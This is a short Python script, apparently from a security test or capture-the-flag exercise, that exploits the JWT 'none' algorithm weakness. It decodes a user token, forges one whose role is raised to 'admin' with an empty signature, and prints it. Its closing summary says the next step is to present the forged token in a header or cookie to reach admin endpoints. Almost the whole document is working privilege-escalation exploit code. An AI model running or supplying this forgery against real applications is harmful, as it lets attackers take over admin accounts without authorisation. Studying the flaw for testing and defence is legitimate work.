import base64
import json

# Original token from authentication
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9."

print("=" * 80)
print("JWT TOKEN ANALYSIS - None Algorithm Vulnerability")
print("=" * 80)

# Split and decode
token_parts = token.split('.')
header_encoded = token_parts[0]
payload_encoded = token_parts[1]
signature_encoded = token_parts[2]

# Decode header
header = json.loads(base64.urlsafe_b64decode(header_encoded + '==').decode())
print(f"\n[+] Decoded Header: {json.dumps(header, indent=2)}")

# Decode payload  
payload = json.loads(base64.urlsafe_b64decode(payload_encoded + '==').decode())
print(f"\n[+] Decoded Payload: {json.dumps(payload, indent=2)}")

print(f"\n[+] Signature Part: {signature_encoded}")

print("\n" + "=" * 80)
print("EXPLOITING NONE ALGORITHM - FORGING ADMIN TOKEN")
print("=" * 80)

# Create new header with none algorithm
new_header = {
    "alg": "none",
    "typ": "JWT"
}

# Create modified payload with admin privileges
new_payload = {
    "username": "user",  # Keep same username
    "role": "admin"      # Escalate to admin role
}

# Base64url encode the new header and payload (without padding)
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

new_header_encoded = base64url_encode(json.dumps(new_header).encode())
new_payload_encoded = base64url_encode(json.dumps(new_payload).encode())
new_signature = ""  # Empty signature for 'none' algorithm

# Construct the forged token with empty signature
forged_token = f"{new_header_encoded}.{new_payload_encoded}.{new_signature}"

print(f"\n[+] Forged Header: {new_header_encoded}")
print(f"[+] Forged Payload: {new_payload_encoded}")
print(f"[+] Forged Signature: (empty)")
print(f"\n[+] FORGED TOKEN (Admin Role):\n{forged_token}")

# Verify the forged token decodes correctly
print("\n[+] Verification - Decoding Forged Token:")
forged_parts = forged_token.split('.')
forged_decoded = json.loads(base64.urlsafe_b64decode(forged_parts[1] + '==').decode())
print(f"{json.dumps(forged_decoded, indent=2)}")

print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print("[+] VULNERABILITY: JWT uses 'none' algorithm (no signature verification)")
print("[+] IMPACT: Can forge tokens with arbitrary privileges")
print("[+] EXPLOITATION: Created admin token with elevated role")
print("[+] NEXT: Use forged token in Authentication header/Cookie to access admin endpoints")
print("=" * 80)
